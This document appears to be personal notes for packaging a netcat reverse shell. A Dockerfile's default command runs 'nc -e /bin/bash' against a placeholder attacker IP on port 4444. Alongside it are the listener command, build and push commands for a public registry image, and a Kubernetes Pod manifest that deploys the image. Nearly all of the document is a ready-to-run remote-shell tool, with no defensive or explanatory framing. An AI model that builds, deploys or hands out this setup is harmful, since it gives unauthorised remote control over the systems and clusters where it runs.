FROM ubuntu:20.04

# Suppress tzdata prompt
ENV DEBIAN_FRONTEND=noninteractive

# Install traditional netcat (not OpenBSD)
RUN apt update && \
	apt install -y netcat-traditional && \
	ln -sf /bin/nc.traditional /bin/nc && \
	apt clean

# Create working dir
WORKDIR /app

# Optional: default to bash shell on reverse connect (override with CMD)
CMD ["nc", "-e", "/bin/bash", "attacker_ip", "4444"]



nc -lvkp 4444
docker build -t nc-reverse-sh:latest .


#docker run --rm -p 4444:4444 nc-reverse-sh:latest
docker run --rm  nc-reverse-sh:latest



apiVersion: v1
kind: Pod
metadata:
  name: nc-server
spec:
  containers:
  - name: nc
    image: angelrita/nc-reverse-sh:latest
    imagePullPolicy: Never
    ports:
    - containerPort: 4444


docker build -t nc-reverse-sh:latest .
docker tag nc-reverse-sh:latest angelrita/nc-reverse-sh:latest
docker push  angelrita/nc-reverse-sh:latest
apply -f nc-reverse-sh.yml
